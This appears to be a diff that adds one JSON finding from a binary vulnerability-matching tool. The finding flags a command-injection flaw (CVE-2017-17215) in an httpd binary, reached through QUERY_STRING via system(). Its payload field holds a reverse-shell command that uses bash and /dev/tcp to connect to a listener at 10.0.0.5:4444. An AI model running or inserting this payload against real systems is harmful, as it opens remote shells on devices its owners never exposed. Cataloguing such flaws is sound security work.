@@ -1,0 +1,10 @@
+{
+  "cve": "CVE-2017-17215",
+  "binary": "bin/httpd",
+  "function": "system",
+  "addr": "0x40a1b0",
+  "vuln_class": "command_injection",
+  "similarity": "0.92",
+  "source": "QUERY_STRING",
+  "payload": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+}
